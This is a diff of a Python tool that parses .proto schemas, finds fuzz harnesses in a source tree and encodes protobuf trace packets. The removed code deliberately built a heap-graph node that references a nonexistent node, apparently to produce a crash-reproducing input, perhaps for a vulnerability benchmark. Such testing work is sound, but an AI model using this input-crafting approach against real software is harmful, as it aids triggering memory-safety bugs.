@@ -2,24 +2,67 @@ import os
 import re
 import tarfile
 import tempfile
-import shutil
-from dataclasses import dataclass
-from typing import Dict, List, Optional, Tuple, Any, Set
+from typing import Dict, List, Optional, Tuple, Any
 
 
-SCALAR_TYPES = {
+_SCALAR_TYPES = {
     "double", "float",
     "int32", "int64", "uint32", "uint64",
     "sint32", "sint64",
-    "fixed32", "fixed64",
-    "sfixed32", "sfixed64",
-    "bool", "string", "bytes",
+    "fixed32", "fixed64", "sfixed32", "sfixed64",
+    "bool",
+    "string", "bytes",
 }
 
 
-def _encode_varint(n: int) -> bytes:
-    if n < 0:
-        n &= (1 << 64) - 1
+def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
+    base = os.path.abspath(path)
+
+    def is_within_directory(directory: str, target: str) -> bool:
+        abs_directory = os.path.abspath(directory)
+        abs_target = os.path.abspath(target)
+        try:
+            common = os.path.commonpath([abs_directory, abs_target])
+        except Exception:
+            return False
+        return common == abs_directory
+
+    members = []
+    for m in tar.getmembers():
+        if not m.name or m.name.startswith("/") or m.name.startswith("\\"):
+            continue
+        dest = os.path.join(base, m.name)
+        if not is_within_directory(base, dest):
+            continue
+        members.append(m)
+    tar.extractall(path=base, members=members)
+
+
+def _read_text_file(path: str, limit: int = 2_000_000) -> str:
+    try:
+        with open(path, "rb") as f:
+            data = f.read(limit)
+        return data.decode("utf-8", errors="ignore")
+    except Exception:
+        return ""
+
+
+def _iter_source_files(root: str) -> List[str]:
+    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".proto", ".inc", ".inl", ".ipp", ".rs", ".go"}
+    out = []
+    for dirpath, dirnames, filenames in os.walk(root):
+        dn = dirpath.lower()
+        if any(x in dn for x in ("/.git", "\\.git", "/third_party", "\\third_party", "/vendor", "\\vendor", "/build", "\\build", "/out", "\\out")):
+            continue
+        for fn in filenames:
+            _, ext = os.path.splitext(fn)
+            if ext.lower() in exts:
+                out.append(os.path.join(dirpath, fn))
+    return out
+
+
+def _varint(n: int) -> bytes:
+    n &= (1 << 64) - 1
     out = bytearray()
     while True:
         b = n & 0x7F
@@ -32,932 +75,434 @@ def _encode_varint(n: int) -> bytes:
     return bytes(out)
 
 
-def _zigzag32(n: int) -> int:
-    return (n << 1) ^ (n >> 31)
+def _zigzag64(x: int) -> int:
+    return (x << 1) ^ (x >> 63)
 
 
-def _zigzag64(n: int) -> int:
-    return (n << 1) ^ (n >> 63)
+def _wire_type_for_scalar(t: str) -> int:
+    if t in ("string", "bytes"):
+        return 2
+    if t in ("fixed64", "sfixed64", "double"):
+        return 1
+    if t in ("fixed32", "sfixed32", "float"):
+        return 5
+    return 0
 
 
-def _encode_key(field_number: int, wire_type: int) -> bytes:
-    return _encode_varint((field_number << 3) | wire_type)
+def _encode_key(field_no: int, wire: int) -> bytes:
+    return _varint((field_no << 3) | wire)
 
 
-def _encode_len_delim(data: bytes) -> bytes:
-    return _encode_varint(len(data)) + data
+def _encode_scalar(t: str, v: Any) -> bytes:
+    if t in ("string",):
+        if isinstance(v, bytes):
+            b = v
+        else:
+            b = str(v).encode("utf-8", errors="ignore")
+        return _varint(len(b)) + b
+    if t in ("bytes",):
+        b = v if isinstance(v, (bytes, bytearray)) else bytes(v)
+        return _varint(len(b)) + b
+    if t in ("fixed64", "sfixed64", "double"):
+        import struct
+        if t == "double":
+            return struct.pack("<d", float(v))
+        return struct.pack("<Q", int(v) & ((1 << 64) - 1))
+    if t in ("fixed32", "sfixed32", "float"):
+        import struct
+        if t == "float":
+            return struct.pack("<f", float(v))
+        return struct.pack("<I", int(v) & ((1 << 32) - 1))
+    if t in ("bool",):
+        return _varint(1 if v else 0)
+    if t in ("sint64",):
+        return _varint(_zigzag64(int(v)))
+    if t in ("sint32",):
+        vv = int(v) & 0xFFFFFFFF
+        if vv & 0x80000000:
+            vv = -((~vv + 1) & 0xFFFFFFFF)
+        return _varint(((vv << 1) ^ (vv >> 31)) & 0xFFFFFFFFFFFFFFFF)
+    return _varint(int(v))
 
 
-@dataclass
-class FieldDef:
-    label: str  # optional/repeated/required/oneof
-    type_name: str
-    name: str
-    number: int
+class _ProtoField:
+    __slots__ = ("name", "num", "label", "type")
+
+    def __init__(self, name: str, num: int, label: str, typ: str):
+        self.name = name
+        self.num = num
+        self.label = label
+        self.type = typ
 
 
-@dataclass
-class MessageDef:
-    full_name: str
-    fields: List[FieldDef]
+class _ProtoSchema:
+    def __init__(self) -> None:
+        self.messages: Dict[str, Dict[str, _ProtoField]] = {}
+        self.simple_to_full: Dict[str, str] = {}
 
+    def add_message(self, full_name: str) -> None:
+        if full_name not in self.messages:
+            self.messages[full_name] = {}
 
-class ProtoSchema:
-    def __init__(self):
-        self.package: str = ""
-        self.messages: Dict[str, MessageDef] = {}
-        self.simple_index: Dict[str, List[str]] = {}
+    def add_field(self, msg_full: str, field: _ProtoField) -> None:
+        self.messages.setdefault(msg_full, {})[field.name] = field
 
-    def add_message(self, msg: MessageDef) -> None:
-        self.messages[msg.full_name] = msg
-        simple = msg.full_name.split(".")[-1]
-        self.simple_index.setdefault(simple, []).append(msg.full_name)
+    def finalize(self) -> None:
+        simple_map: Dict[str, List[str]] = {}
+        for full in self.messages.keys():
+            simple = full.split(".")[-1]
+            simple_map.setdefault(simple, []).append(full)
+        for s, lst in simple_map.items():
+            if len(lst) == 1:
+                self.simple_to_full[s] = lst[0]
 
-    def resolve_message(self, type_name: str) -> Optional[str]:
-        t = type_name.strip()
+    def resolve_message(self, typ: str) -> Optional[str]:
+        t = typ.strip()
+        if not t:
+            return None
         if t.startswith("."):
             t = t[1:]
         if t in self.messages:
             return t
         simple = t.split(".")[-1]
-        cands = self.simple_index.get(simple)
-        if not cands:
-            return None
-        if len(cands) == 1:
-            return cands[0]
-        if self.package:
-            pkg = self.package + "."
-            for c in cands:
-                if c.startswith(pkg):
-                    return c
-        return cands[0]
-
-    def find_by_simple(self, simple: str) -> Optional[str]:
-        cands = self.simple_index.get(simple)
-        if not cands:
-            return None
-        if len(cands) == 1:
-            return cands[0]
-        if self.package:
-            pkg = self.package + "."
-            for c in cands:
-                if c.startswith(pkg):
-                    return c
-        return cands[0]
-
-    @staticmethod
-    def _strip_comments(text: str) -> str:
-        text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
-        text = re.sub(r"//[^\n]*", "", text)
-        return text
-
-    @staticmethod
-    def _find_matching_brace(text: str, open_idx: int) -> int:
-        depth = 0
-        i = open_idx
-        n = len(text)
-        while i < n:
-            c = text[i]
-            if c == "{":
-                depth += 1
-            elif c == "}":
-                depth -= 1
-                if depth == 0:
-                    return i
-            i += 1
-        return -1
-
-    @staticmethod
-    def _extract_message_blocks(text: str, prefix: str = "") -> List[Tuple[str, str]]:
-        blocks: List[Tuple[str, str]] = []
-        i = 0
-        n = len(text)
-        msg_re = re.compile(r"\bmessage\s+([A-Za-z_]\w*)\s*\{")
-        while i < n:
-            m = msg_re.search(text, i)
-            if not m:
-                break
-            name = m.group(1)
-            brace_open = text.find("{", m.end() - 1)
-            if brace_open < 0:
-                i = m.end()
-                continue
-            brace_close = ProtoSchema._find_matching_brace(text, brace_open)
-            if brace_close < 0:
-                i = m.end()
-                continue
-            body = text[brace_open + 1:brace_close]
-            full = f"{prefix}.{name}" if prefix else name
-            blocks.append((full, body))
-            blocks.extend(ProtoSchema._extract_message_blocks(body, full))
-            i = brace_close + 1
-        return blocks
-
-    @staticmethod
-    def _parse_fields_from_body(body: str) -> List[FieldDef]:
-        fields: List[FieldDef] = []
-
-        def parse_statement(stmt: str, label_override: Optional[str] = None) -> None:
-            s = " ".join(stmt.strip().split())
-            if not s:
-                return
-            if s.startswith(("reserved ", "option ", "extensions ", "extend ", "enum ", "message ", "service ", "import ", "package ", "syntax ")):
-                return
-            if s.startswith("map<"):
-                m = re.match(r"map<[^>]+>\s+([A-Za-z_]\w*)\s*=\s*(\d+)", s)
-                if m:
-                    name = m.group(1)
-                    num = int(m.group(2))
-                    fields.append(FieldDef(label_override or "optional", "map", name, num))
-                return
-
-            m = re.match(r"(?:(optional|required|repeated)\s+)?([.\w]+)\s+([A-Za-z_]\w*)\s*=\s*(\d+)\b", s)
-            if not m:
-                return
-            label = m.group(1) or (label_override or "optional")
-            type_name = m.group(2)
-            name = m.group(3)
-            num = int(m.group(4))
-            fields.append(FieldDef(label, type_name, name, num))
-
-        # depth-0 statements
-        buf = []
-        depth = 0
-        i = 0
-        n = len(body)
-        while i < n:
-            c = body[i]
-            if c == "{":
-                depth += 1
-                buf.append(c)
-                i += 1
-                continue
-            if c == "}":
-                depth -= 1
-                buf.append(c)
-                i += 1
-                continue
-            if c == ";" and depth == 0:
-                stmt = "".join(buf)
-                buf.clear()
-                parse_statement(stmt)
-                i += 1
-                continue
-            buf.append(c)
-            i += 1
-
-        # parse oneof blocks for fields too
-        oneof_re = re.compile(r"\boneof\s+([A-Za-z_]\w*)\s*\{")
-        i = 0
-        while True:
-            m = oneof_re.search(body, i)
-            if not m:
-                break
-            brace_open = body.find("{", m.end() - 1)
-            if brace_open < 0:
-                i = m.end()
-                continue
-            brace_close = ProtoSchema._find_matching_brace(body, brace_open)
-            if brace_close < 0:
-                i = m.end()
-                continue
-            oneof_body = body[brace_open + 1:brace_close]
-            for stmt in oneof_body.split(";"):
-                parse_statement(stmt, label_override="oneof")
-            i = brace_close + 1
-
-        return fields
-
-    @classmethod
-    def from_dir(cls, root: str) -> "ProtoSchema":
-        schema = cls()
-        proto_paths: List[str] = []
-        for dirpath, _, filenames in os.walk(root):
-            for fn in filenames:
-                if fn.endswith(".proto"):
-                    proto_paths.append(os.path.join(dirpath, fn))
-
-        # parse package from a likely root proto if present
-        for p in sorted(proto_paths):
-            try:
-                with open(p, "rb") as f:
-                    data = f.read(2_000_000)
-            except Exception:
-                continue
-            txt = data.decode("utf-8", errors="ignore")
-            txt = cls._strip_comments(txt)
-            pm = re.search(r"\bpackage\s+([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*)\s*;", txt)
-            if pm:
-                schema.package = pm.group(1)
-                break
-
-        for p in proto_paths:
-            try:
-                with open(p, "rb") as f:
-                    data = f.read(5_000_000)
-            except Exception:
-                continue
-            txt = data.decode("utf-8", errors="ignore")
-            txt = cls._strip_comments(txt)
-            pkg = schema.package
-            pm = re.search(r"\bpackage\s+([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*)\s*;", txt)
-            if pm:
-                pkg = pm.group(1)
-
-            blocks = cls._extract_message_blocks(txt, prefix=pkg if pkg else "")
-            for full_name, body in blocks:
-                if not full_name:
-                    continue
-                if full_name in schema.messages:
-                    continue
-                fields = cls._parse_fields_from_body(body)
-                schema.add_message(MessageDef(full_name, fields))
-        return schema
+        return self.simple_to_full.get(simple)
 
 
-def _iter_source_files(root: str) -> List[str]:
-    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc"}
-    out = []
-    for dirpath, _, filenames in os.walk(root):
-        for fn in filenames:
-            _, ext = os.path.splitext(fn)
-            if ext.lower() in exts:
-                out.append(os.path.join(dirpath, fn))
-    return out
-
-
-def _read_text(path: str, limit: int = 2_000_000) -> str:
-    try:
-        with open(path, "rb") as f:
-            data = f.read(limit)
-        return data.decode("utf-8", errors="ignore")
-    except Exception:
-        return ""
-
-
-def _find_clue_message_names(root: str) -> Set[str]:
-    clues: Set[str] = set()
-    for p in _iter_source_files(root):
-        txt = _read_text(p, 2_000_000)
-        if "node_id_map" not in txt:
-            continue
-        for m in re.finditer(r"\bpbzero::([A-Za-z_]\w*)::Decoder\b", txt):
-            clues.add(m.group(1))
-        for m in re.finditer(r"\bprotos::pbzero::([A-Za-z_]\w*)::Decoder\b", txt):
-            clues.add(m.group(1))
-        for m in re.finditer(r"\b([A-Za-z_]\w*)::Decoder\b", txt):
-            name = m.group(1)
-            if "Heap" in name or "Snapshot" in name or "Graph" in name:
-                clues.add(name)
-    return clues
-
-
-def _detect_root_preference(root: str) -> str:
-    # returns "Trace", "TracePacket", or ""
-    score_trace = 0
-    score_packet = 0
-    for p in _iter_source_files(root):
-        txt = _read_text(p, 1_000_000)
+def _parse_proto_files(proto_paths: List[str]) -> _ProtoSchema:
+    schema = _ProtoSchema()
+    for p in proto_paths:
+        txt = _read_text_file(p, limit=5_000_000)
         if not txt:
             continue
-        if "Trace::Decoder" in txt or "pbzero::Trace::Decoder" in txt:
-            score_trace += 2
-        if "TracePacket::Decoder" in txt or "pbzero::TracePacket::Decoder" in txt:
-            score_packet += 2
-        if "ParseTrace" in txt or "TraceProcessor" in txt:
-            score_trace += 1
-        if "LLVMFuzzerTestOneInput" in txt:
-            if "TracePacket::Decoder" in txt:
-                score_packet += 3
-            if "Trace::Decoder" in txt:
-                score_trace += 3
-    if score_trace > score_packet and score_trace > 0:
-        return "Trace"
-    if score_packet > score_trace and score_packet > 0:
-        return "TracePacket"
-    return ""
+        txt = re.sub(r"/\*.*?\*/", "", txt, flags=re.S)
+        lines = txt.splitlines()
+        stack: List[str] = []
+        in_enum_depth = 0
+        in_oneof_depth = 0
 
-
-def _message_score(schema: ProtoSchema, msg_full: str) -> int:
-    md = schema.messages.get(msg_full)
-    if not md:
-        return -10
-    name = msg_full.split(".")[-1].lower()
-    score = 0
-    if "heap" in name:
-        score += 6
-    if "snapshot" in name:
-        score += 5
-    if "graph" in name:
-        score += 4
-    if "profile" in name:
-        score += 2
-    if "dump" in name:
-        score += 1
-
-    rep_msg_fields = 0
-    node_like = 0
-    edge_like = 0
-    for f in md.fields:
-        t_full = schema.resolve_message(f.type_name)
-        if f.label == "repeated" and t_full:
-            rep_msg_fields += 1
-            fn = f.name.lower()
-            tn = t_full.split(".")[-1].lower()
-            if "node" in fn or "object" in fn or "node" in tn or "object" in tn:
-                node_like += 1
-            if "edge" in fn or "ref" in fn or "edge" in tn or "ref" in tn:
-                edge_like += 1
-    score += rep_msg_fields
-    score += node_like * 4
-    score += edge_like * 3
-    return score
-
-
-def _choose_best_target_message(schema: ProtoSchema, prefer_simples: Set[str]) -> Optional[str]:
-    # Prefer any clue-derived messages if they exist
-    for simple in list(prefer_simples):
-        full = schema.find_by_simple(simple)
-        if full:
-            return full
-
-    best = None
-    best_score = -10**9
-    for msg_full in schema.messages.keys():
-        s = _message_score(schema, msg_full)
-        if s > best_score:
-            best_score = s
-            best = msg_full
-    if best_score <= 0:
-        return None
-    return best
-
-
-def _build_graph(schema: ProtoSchema) -> Dict[str, List[Tuple[str, str]]]:
-    # msg -> [(field_name, child_msg)]
-    g: Dict[str, List[Tuple[str, str]]] = {}
-    for mfull, md in schema.messages.items():
-        adj = []
-        for f in md.fields:
-            child = schema.resolve_message(f.type_name)
-            if child and child in schema.messages:
-                adj.append((f.name, child))
-        g[mfull] = adj
-    return g
-
-
-def _find_path(schema: ProtoSchema, start: str, target: str, max_depth: int = 6) -> Optional[List[Tuple[str, str, str]]]:
-    if start == target:
-        return []
-    g = _build_graph(schema)
-    from collections import deque
-    q = deque()
-    q.append(start)
-    prev: Dict[str, Tuple[str, str]] = {}  # node -> (parent, via_field)
-    depth: Dict[str, int] = {start: 0}
-    while q:
-        cur = q.popleft()
-        d = depth[cur]
-        if d >= max_depth:
-            continue
-        for fname, nxt in g.get(cur, []):
-            if nxt in depth:
+        for raw in lines:
+            line = re.sub(r"//.*", "", raw).strip()
+            if not line:
                 continue
-            depth[nxt] = d + 1
-            prev[nxt] = (cur, fname)
-            if nxt == target:
-                q.clear()
-                break
-            q.append(nxt)
-    if target not in depth:
-        return None
-    # reconstruct
-    path_rev: List[Tuple[str, str, str]] = []
-    cur = target
-    while cur != start:
-        parent, fname = prev[cur]
-        path_rev.append((parent, fname, cur))
-        cur = parent
-    path_rev.reverse()
-    return path_rev
+
+            if re.match(r"^\s*enum\s+\w+\s*\{", line):
+                in_enum_depth += line.count("{") - line.count("}")
+                continue
+            if in_enum_depth > 0:
+                in_enum_depth += line.count("{") - line.count("}")
+                continue
+
+            if re.match(r"^\s*oneof\s+\w+\s*\{", line):
+                in_oneof_depth += line.count("{") - line.count("}")
+                continue
+            if in_oneof_depth > 0:
+                in_oneof_depth += line.count("{") - line.count("}")
+                continue
+
+            m = re.match(r"^\s*message\s+([A-Za-z_]\w*)\s*\{", line)
+            if m:
+                name = m.group(1)
+                full = ".".join(stack + [name]) if stack else name
+                stack.append(name)
+                schema.add_message(full)
+                continue
+
+            if "{" in line:
+                pass
+
+            if "}" in line:
+                closes = line.count("}")
+                for _ in range(closes):
+                    if stack:
+                        stack.pop()
+                continue
+
+            if not stack:
+                continue
+
+            fm = re.match(
+                r"^\s*(optional|required|repeated)?\s*(map\s*<[^>]+>|[A-Za-z_][\w\.]*)\s+([A-Za-z_]\w*)\s*=\s*(\d+)\s*(?:\[[^\]]*\])?\s*;",
+                line,
+            )
+            if not fm:
+                continue
+            label = (fm.group(1) or "optional").strip()
+            typ = fm.group(2).strip()
+            name = fm.group(3).strip()
+            num = int(fm.group(4))
+            msg_full = ".".join(stack)
+            schema.add_field(msg_full, _ProtoField(name=name, num=num, label=label, typ=typ))
+
+    schema.finalize()
+    return schema
 
 
-def _choose_field(md: MessageDef, predicate) -> Optional[FieldDef]:
-    for f in md.fields:
-        if predicate(f):
-            return f
-    return None
-
-
-def _choose_fields(md: MessageDef, predicate) -> List[FieldDef]:
-    return [f for f in md.fields if predicate(f)]
-
-
-def _is_scalar_type(t: str) -> bool:
-    t = t.strip()
-    if t.startswith("."):
-        t = t[1:]
-    t = t.split(".")[-1]
-    return t in SCALAR_TYPES
-
-
-def _encode_scalar(type_name: str, value: Any) -> bytes:
-    t = type_name.strip()
-    if t.startswith("."):
-        t = t[1:]
-    t = t.split(".")[-1]
-    if t in ("int32", "int64", "uint32", "uint64", "bool", "enum"):
-        v = int(value)
-        return _encode_varint(v)
-    if t == "sint32":
-        v = int(value)
-        return _encode_varint(_zigzag32(v))
-    if t == "sint64":
-        v = int(value)
-        return _encode_varint(_zigzag64(v))
-    if t in ("fixed32", "sfixed32", "float"):
-        v = int(value) & 0xFFFFFFFF
-        return v.to_bytes(4, "little", signed=False)
-    if t in ("fixed64", "sfixed64", "double"):
-        v = int(value) & 0xFFFFFFFFFFFFFFFF
-        return v.to_bytes(8, "little", signed=False)
-    if t == "string":
-        if isinstance(value, bytes):
-            b = value
-        else:
-            b = str(value).encode("utf-8", errors="ignore")
-        return _encode_len_delim(b)
-    if t == "bytes":
-        b = value if isinstance(value, (bytes, bytearray)) else bytes(value)
-        return _encode_len_delim(bytes(b))
-    # default to varint
-    return _encode_varint(int(value))
-
-
-def _wire_type_for(type_name: str, is_message: bool) -> int:
-    if is_message:
-        return 2
-    t = type_name.strip()
-    if t.startswith("."):
-        t = t[1:]
-    t = t.split(".")[-1]
-    if t in ("fixed64", "sfixed64", "double"):
-        return 1
-    if t in ("fixed32", "sfixed32", "float"):
-        return 5
-    if t in ("string", "bytes"):
-        return 2
-    return 0
-
-
-def _encode_message(schema: ProtoSchema, msg_full: str, values: Dict[str, Any]) -> bytes:
-    md = schema.messages.get(msg_full)
-    if not md:
+def _encode_message(schema: _ProtoSchema, msg_full: str, values: Dict[str, Any]) -> bytes:
+    fields = schema.messages.get(msg_full)
+    if not fields:
         return b""
     out = bytearray()
-    for f in md.fields:
-        if f.name not in values:
+
+    for fname, f in fields.items():
+        if fname not in values:
             continue
-        v = values[f.name]
-        if v is None:
-            continue
+        v = values[fname]
+        is_repeated = f.label == "repeated"
+        vals = v if (is_repeated and isinstance(v, list)) else ([v] if is_repeated else [v])
 
-        child_full = schema.resolve_message(f.type_name)
-        is_msg = child_full is not None and child_full in schema.messages
-
-        def emit_one(one_v: Any) -> None:
-            if is_msg:
-                if isinstance(one_v, dict):
-                    payload = _encode_message(schema, child_full, one_v)
-                else:
-                    payload = bytes(one_v)
-                out.extend(_encode_key(f.number, 2))
-                out.extend(_encode_len_delim(payload))
+        for item in vals:
+            typ = f.type.strip()
+            if typ.startswith("map<") or typ.startswith("map <"):
+                continue
+            if typ in _SCALAR_TYPES:
+                wire = _wire_type_for_scalar(typ)
+                out += _encode_key(f.num, wire)
+                out += _encode_scalar(typ, item)
             else:
-                wire = _wire_type_for(f.type_name, False)
-                out.extend(_encode_key(f.number, wire))
-                out.extend(_encode_scalar(f.type_name, one_v))
+                msg_t = schema.resolve_message(typ)
+                if not msg_t:
+                    continue
+                if not isinstance(item, dict):
+                    continue
+                payload = _encode_message(schema, msg_t, item)
+                out += _encode_key(f.num, 2)
+                out += _varint(len(payload))
+                out += payload
 
-        if f.label == "repeated":
-            if isinstance(v, list):
-                for one in v:
-                    emit_one(one)
-            else:
-                emit_one(v)
-        else:
-            emit_one(v)
     return bytes(out)
 
 
-def _fill_common_scalars(md: MessageDef) -> Dict[str, int]:
-    vals: Dict[str, int] = {}
-    for f in md.fields:
-        if not _is_scalar_type(f.type_name):
+def _find_relevant_texts(files: List[str]) -> Tuple[Dict[str, str], List[str], List[str]]:
+    texts: Dict[str, str] = {}
+    node_map_files: List[str] = []
+    fuzzer_files: List[str] = []
+    total_bytes = 0
+    for p in files:
+        if total_bytes > 35_000_000:
+            break
+        txt = _read_text_file(p)
+        if not txt:
             continue
-        nm = f.name.lower()
-        if nm in ("pid", "tgid", "process_id", "processid", "upid", "client_pid", "writer_pid"):
-            vals[f.name] = 1
-        elif nm in ("tid", "thread_id", "utid"):
-            vals[f.name] = 1
-        elif "timestamp" in nm or nm in ("ts", "time_ns", "time", "start_timestamp", "end_timestamp", "event_time_ns"):
-            vals[f.name] = 1
-        elif nm in ("sequence_id", "trusted_packet_sequence_id", "seq_id", "seqid"):
-            vals[f.name] = 1
-    return vals
+        total_bytes += len(txt)
+        lower = txt.lower()
+        if "node_id_map" in txt:
+            node_map_files.append(p)
+        if "llvmfuzzertestoneinput" in lower:
+            fuzzer_files.append(p)
+        texts[p] = txt
+    return texts, node_map_files, fuzzer_files
 
 
-def _choose_id_field(md: MessageDef) -> Optional[FieldDef]:
-    scalar_fields = [f for f in md.fields if _is_scalar_type(f.type_name)]
-    exact = [f for f in scalar_fields if f.name == "id"]
-    if exact:
-        return exact[0]
-    for nm in ("object_id", "node_id", "heap_object_id", "graph_node_id", "uid", "iid"):
-        for f in scalar_fields:
-            if f.name.lower() == nm:
-                return f
-    for f in scalar_fields:
-        if f.name.lower().endswith("_id") and "type" not in f.name.lower():
-            return f
-    for f in scalar_fields:
-        if "id" in f.name.lower() and "type" not in f.name.lower():
-            return f
-    return scalar_fields[0] if scalar_fields else None
+def _infer_from_code_for_protobuf(texts: Dict[str, str], node_map_files: List[str], fuzzer_files: List[str]) -> Optional[Dict[str, str]]:
+    info: Dict[str, str] = {}
 
-
-def _choose_ref_field(md: MessageDef, schema: ProtoSchema) -> Optional[FieldDef]:
-    # prefer repeated fields related to refs/edges
-    def is_candidate(f: FieldDef) -> bool:
-        nm = f.name.lower()
-        if f.label != "repeated":
-            return False
-        if any(k in nm for k in ("ref", "edge", "child", "children", "out", "target", "to", "reference")):
-            return True
-        t = f.type_name.split(".")[-1].lower()
-        if any(k in t for k in ("ref", "edge", "reference")):
-            return True
-        return False
-
-    cands = [f for f in md.fields if is_candidate(f)]
-    if cands:
-        # prefer scalar first
-        for f in cands:
-            if _is_scalar_type(f.type_name):
-                return f
-        return cands[0]
-
-    # fallback: any repeated scalar field ending with _id
-    for f in md.fields:
-        if f.label == "repeated" and _is_scalar_type(f.type_name):
-            if "id" in f.name.lower():
-                return f
-    return None
-
-
-def _choose_nodes_field(md: MessageDef, schema: ProtoSchema) -> Optional[FieldDef]:
-    rep_msg = [f for f in md.fields if f.label == "repeated" and schema.resolve_message(f.type_name) in schema.messages]
-    def score(f: FieldDef) -> int:
-        nm = f.name.lower()
-        tn = (schema.resolve_message(f.type_name) or f.type_name).split(".")[-1].lower()
-        s = 0
-        if "node" in nm or "node" in tn:
-            s += 6
-        if "object" in nm or "object" in tn:
-            s += 5
-        if "entry" in nm or "item" in nm:
-            s += 1
-        if "type" in nm:
-            s -= 2
-        if "edge" in nm or "ref" in nm:
-            s -= 1
-        return s
-    if not rep_msg:
-        return None
-    rep_msg.sort(key=score, reverse=True)
-    return rep_msg[0]
-
-
-def _choose_edges_field(md: MessageDef, schema: ProtoSchema) -> Optional[FieldDef]:
-    rep_msg = [f for f in md.fields if f.label == "repeated" and schema.resolve_message(f.type_name) in schema.messages]
-    def score(f: FieldDef) -> int:
-        nm = f.name.lower()
-        tn = (schema.resolve_message(f.type_name) or f.type_name).split(".")[-1].lower()
-        s = 0
-        if "edge" in nm or "edge" in tn:
-            s += 6
-        if "ref" in nm or "ref" in tn or "reference" in nm or "reference" in tn:
-            s += 5
-        if "link" in nm:
-            s += 2
-        if "node" in nm or "object" in nm:
-            s -= 1
-        return s
-    if not rep_msg:
-        return None
-    rep_msg.sort(key=score, reverse=True)
-    best = rep_msg[0]
-    if score(best) <= 0:
-        return None
-    return best
-
-
-def _choose_edge_endpoints(edge_md: MessageDef) -> Tuple[Optional[FieldDef], Optional[FieldDef]]:
-    scalar = [f for f in edge_md.fields if _is_scalar_type(f.type_name)]
-    if not scalar:
-        return None, None
-
-    def find_any(keys: List[str], prefer_suffix: bool = False) -> Optional[FieldDef]:
-        for k in keys:
-            for f in scalar:
-                nm = f.name.lower()
-                if prefer_suffix:
-                    if nm.endswith(k):
-                        return f
-                else:
-                    if k in nm:
-                        return f
-        return None
-
-    src = find_any(["source", "src", "from", "owner", "origin", "parent"], prefer_suffix=False)
-    dst = find_any(["target", "dst", "to", "child", "ref", "reference"], prefer_suffix=False)
-
-    if not src:
-        src = find_any(["_id", "id"], prefer_suffix=True)
-    if not dst:
-        dst = find_any(["_id", "id"], prefer_suffix=True)
-
-    if src and dst and src.name == dst.name:
-        # try alternate
-        for f in scalar:
-            if f.name != src.name:
-                dst = f
-                break
-    return src, dst
-
-
-def _make_target_payload(schema: ProtoSchema, target_full: str) -> Dict[str, Any]:
-    md = schema.messages.get(target_full)
-    if not md:
-        return {}
-    payload: Dict[str, Any] = {}
-    payload.update(_fill_common_scalars(md))
-
-    nodes_field = _choose_nodes_field(md, schema)
-    edges_field = _choose_edges_field(md, schema)
-
-    # Build node with missing reference
-    if nodes_field:
-        node_full = schema.resolve_message(nodes_field.type_name)
-        node_md = schema.messages.get(node_full) if node_full else None
-        if node_md:
-            node_obj: Dict[str, Any] = {}
-            node_obj.update(_fill_common_scalars(node_md))
-            id_field = _choose_id_field(node_md)
-            if id_field:
-                node_obj[id_field.name] = 1
-
-            ref_field = _choose_ref_field(node_md, schema)
-            if ref_field:
-                if _is_scalar_type(ref_field.type_name):
-                    node_obj[ref_field.name] = [2]
-                else:
-                    ref_full = schema.resolve_message(ref_field.type_name)
-                    ref_md = schema.messages.get(ref_full) if ref_full else None
-                    if ref_md:
-                        ref_obj: Dict[str, Any] = {}
-                        ref_obj.update(_fill_common_scalars(ref_md))
-                        rid = _choose_id_field(ref_md)
-                        if rid:
-                            ref_obj[rid.name] = 2
-                        else:
-                            # try target-like scalar fields
-                            for f in ref_md.fields:
-                                if _is_scalar_type(f.type_name) and any(k in f.name.lower() for k in ("to", "target", "ref", "id")):
-                                    ref_obj[f.name] = 2
-                                    break
-                        node_obj[ref_field.name] = [ref_obj]
-            payload[nodes_field.name] = [node_obj]
-
-    # Also add explicit edge if possible (in case refs aren't per-node)
-    if edges_field:
-        edge_full = schema.resolve_message(edges_field.type_name)
-        edge_md = schema.messages.get(edge_full) if edge_full else None
-        if edge_md:
-            edge_obj: Dict[str, Any] = {}
-            edge_obj.update(_fill_common_scalars(edge_md))
-            src_f, dst_f = _choose_edge_endpoints(edge_md)
-            if src_f:
-                edge_obj[src_f.name] = 1
-            if dst_f:
-                edge_obj[dst_f.name] = 2
-            if edge_obj:
-                payload[edges_field.name] = [edge_obj]
-
-    # If no nodes/edges found, try best-effort: set any id-like field and any repeated id-like field
-    if not payload:
-        payload.update(_fill_common_scalars(md))
-    return payload
-
-
-def _make_wrapped_packet(schema: ProtoSchema, packet_full: str, target_full: str, prefer_path_from_packet: Optional[List[Tuple[str, str, str]]] = None) -> Dict[str, Any]:
-    packet_md = schema.messages.get(packet_full)
-    if not packet_md:
-        return {}
-
-    target_payload = _make_target_payload(schema, target_full)
-
-    # determine a path packet -> ... -> target
-    path = prefer_path_from_packet
-    if path is None:
-        path = _find_path(schema, packet_full, target_full, max_depth=6)
-    if path is None:
-        # maybe target is directly packet_full
-        if packet_full == target_full:
-            pkt_values = {}
-            pkt_values.update(_fill_common_scalars(packet_md))
-            pkt_values.update(target_payload)
-            return pkt_values
-        # fall back: try to inject into any field whose type matches target simple name
-        target_simple = target_full.split(".")[-1]
-        for f in packet_md.fields:
-            child = schema.resolve_message(f.type_name)
-            if child and child.split(".")[-1] == target_simple:
-                pkt_values = {}
-                pkt_values.update(_fill_common_scalars(packet_md))
-                pkt_values[f.name] = target_payload
-                return pkt_values
-        return {}
-
-    # Build nested dict following path
-    cur_payload: Dict[str, Any] = target_payload
-    for parent_full, fname, child_full in reversed(path):
-        parent_md = schema.messages.get(parent_full)
-        if not parent_md:
+    parse_files = fuzzer_files[:] or node_map_files[:]
+    root_type = None
+    for fp in parse_files:
+        t = texts.get(fp, "")
+        if not t:
             continue
-        wrapper: Dict[str, Any] = {}
-        wrapper.update(_fill_common_scalars(parent_md))
-        wrapper[fname] = cur_payload
-        cur_payload = wrapper
-
-    # cur_payload now corresponds to packet_full values
-    if packet_full != path[0][0]:
-        # unexpected, but merge
-        pkt_values = {}
-        pkt_values.update(_fill_common_scalars(packet_md))
-        pkt_values.update(cur_payload)
-        return pkt_values
-
-    pkt_values = {}
-    pkt_values.update(_fill_common_scalars(packet_md))
-    pkt_values.update(cur_payload)
-    return pkt_values
-
